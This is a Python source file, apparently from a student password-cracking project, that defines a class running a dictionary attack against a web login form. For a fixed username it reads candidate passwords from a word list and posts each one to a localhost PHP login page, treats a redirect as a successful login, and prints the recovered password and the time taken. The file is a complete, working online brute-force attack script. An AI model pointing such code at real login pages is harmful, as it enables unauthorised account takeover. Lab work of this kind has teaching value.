import time
import requests

from Cracker import Cracker

class CrackerDictionnary (Cracker):
    def __init__(self):
        pass
    
    def find_passwd(self) -> None:
        find = True
        
        url = 'http://localhost/cracking-project/project/index.php'
        payload = {
            'username': 'Pa-Alioune',
            'pass' : ""
        }
                
        with open("dico.txt", "r", encoding="utf-8") as f:
            lines = f.read().splitlines()
        print("Attaque en cours...")    
        start = time.time()    
        for line in lines:
            payload['pass'] = line     
            with requests.Session() as s:
                s.get(url)
                r = s.post(url, data=payload)
                if (r.history):
                    find = False
                    break
        duration = time.ctime(time.time() - start)[11:19]    
        if(find):
            print("Nous n'avons pas réussi à cracker ton mot de passe;\n Car elle ne se trouve pas dans notre dictionnaire.")
        else:
            print("\nBingo 🤩")
            print(f"Le mot de passe de ton compte est \"{payload['pass']}\".")
            print(f"Cela nous a pris {duration}s pour le retrouver.")    
    
    
    
    